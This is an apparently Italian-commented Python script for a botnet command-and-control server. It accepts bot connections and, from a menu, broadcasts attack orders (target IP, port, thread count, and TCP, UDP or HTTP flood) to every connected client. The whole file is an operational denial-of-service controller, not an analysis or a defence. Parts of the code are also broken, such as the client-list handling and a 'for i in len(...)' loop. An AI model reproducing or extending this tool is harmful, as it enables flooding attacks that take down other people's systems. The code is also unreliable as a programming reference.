import tkinter as tk
import threading
import socket
import os

try:
    # Funzione per gestire la connessione di un singolo client
    def handle_client(client_socket, address):
        while True:
            # Ricevi dati dal client
            request = client_socket.recv(1024).decode('utf-8')

            # Se il client si disconnette o invia 'exit', chiudi la connessione
            if not request or request.lower() == 'exit':
                print("Client", address, "disconnesso")
                clients.remove(client_socket)
                break
            else:
                print("Messaggio ricevuto dal client", address, ":", request)

                # Invia conferma al client
                client_socket.send("Messaggio ricevuto dal server".encode('utf-8'))

        # Chiudi la connessione con il client
        client_socket.close()

    # Funzione per inviare un messaggio a tutti i client connessi
    def send_message_to_clients(message):
        if clients:
            for client, _ in clients:
                try:
                    client.send(message.encode('utf-8'))
                except Exception as e:
                    print("Errore durante l'invio del messaggio:", e)
        else:
            print("Nessun client connesso.")

    # Funzione per avviare il server
    def start_server(ip, port, threads):
        global server_running
        global server

        # Controlla se il server è già in esecuzione
        if server_running:
            print("Il server è già in esecuzione.")
            return

        # Crea il socket del server
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((ip, port))
        server.listen()

        print("Server in ascolto su", ip, "porta", port)

        # Avvia i thread per gestire i client
        for _ in range(threads):
            client_thread = threading.Thread(target=handle_clients)
            client_thread.daemon = True
            client_thread.start()

        server_running = True

        # Thread per accettare nuove connessioni
        accept_thread = threading.Thread(target=accept_connections)
        accept_thread.daemon = True
        accept_thread.start()

    # Funzione per gestire i client
    def handle_clients():
        while True:
            if not server_running:
                break

            if clients:
                client_socket, client_address = clients.pop(0)
                handle_client(client_socket, client_address)

    # Funzione per accettare nuove connessioni
    def accept_connections():
        global server_running

        while True:
            if not server_running:
                break

            # Accetta una nuova connessione
            client_socket, client_address = server.accept()
            # print("Connessione da:", client_address)

            # Aggiungi il client alla lista dei client connessi
            clients.append((client_socket, client_address))
            clients_addr.append(client_address)

    # Funzione per fermare il server
    def stop_server():
        global server_running
        global server

        # Controlla se il server è in esecuzione
        if not server_running:
            print("Il server non è in esecuzione.")
            return

        send_message_to_clients("terminate")
        
        # Chiudi il socket del server
        server.close()
        server_running = False
        print("Server fermato.")

    def clear():
        os.system("clear")

    # Funzione principale del server
    def main():
        while True:  # Loop infinito per consentire all'utente di interagire con il menu più volte
            print("\nMenu:")
            print("1) Avvia server")
            print("2) Ferma server")
            print("3) Invia messaggio ai client")
            print("4) Lista clients")
            print("0) Esci")

            choice = input("Seleziona un'opzione: ")  # L'utente seleziona un'opzione

            clear()  # Funzione per pulire lo schermo, non definita in questo codice

            if choice == '1':  # Se l'utente sceglie di avviare il server
                start_server("10.0.0.100", 20000, 10)  # Avvia il server con indirizzo IP, porta e numero massimo di connessioni specificati
            elif choice == '2':  # Se l'utente sceglie di fermare il server
                stop_server()  # Ferma il server
            elif choice == '3':  # Se l'utente sceglie di inviare un messaggio ai client
                while True:  # Loop per garantire la scelta corretta del tipo di messaggio
                    message = ""
                    message_type = input("1) attacco \n2) conferma\n3) abort\n> ")  # L'utente specifica il tipo di messaggio
                    clear()  # Pulisce lo schermo

                    if message_type == "1":  # Se l'utente sceglie di inviare un messaggio di attacco
                        ip = input("IP da attaccare: ")  # L'utente specifica l'IP di destinazione
                        porta = input("Porta da attaccare: ")  # L'utente specifica la porta di destinazione
                        threads = input("Numero di thread: ")  # L'utente specifica il numero di thread
                        method = ""
                        while True:
                            method = input("1) TCP FLOOD\n2) UDP FLOOD\n3) HTTP FLOOD\n> ")
                            if method == "1":
                                method = "TCP_FLOOD"
                                break
                            elif method == "2":
                                method = "UDP_FLOOD"
                                break
                            elif method == "3":
                                method = "HTTP_FLOOD"
                                break
                            else:
                                print("Metodo non valido.")
                        message = f"attack {ip} {porta} {threads} {method}"  # Costruisce il messaggio di attacco
                        send_message_to_clients(message)  # Invia il messaggio ai client
                        break  # Esce dal loop interno
                    elif message_type == "3":  # Se l'utente sceglie di inviare un messaggio di stop
                        send_message_to_clients("abort")  # Invia il messaggio ai client
                        break  # Esce dal loop interno
                    elif message_type == "2":
                        send_message_to_clients("confirm")
                        break
                    else:
                        print("Tipo di messaggio non valido.")  # Se l'utente inserisce un tipo di messaggio non valido

            elif choice == '4':
                    for i in len(clients_addr):
                        print(f"Client {i}: {clients_addr[i]}")
            
            elif choice == '0':  # Se l'utente sceglie di uscire dal programma
                stop_server()  # Ferma il server
                break  # Esce dal ciclo infinito
            else:
                print("Opzione non valida.")  # Se l'utente inserisce un'opzione non valida

    # Variabili globali
    server_running = False
    server = None
    clients_addr = []
    clients = []

    # Avvia il programma
    if __name__ == "__main__":
        main()

except KeyboardInterrupt:
    clear()
    print("Rilevato CTRL+C. Uscita dal programma.")
    if server_running:
        stop_server()
    exit
except Exception as e:
    clear()
    if server_running:
        stop_server()
    print(f"Error was occurred.\n Error detaild:\n {e}")
    exit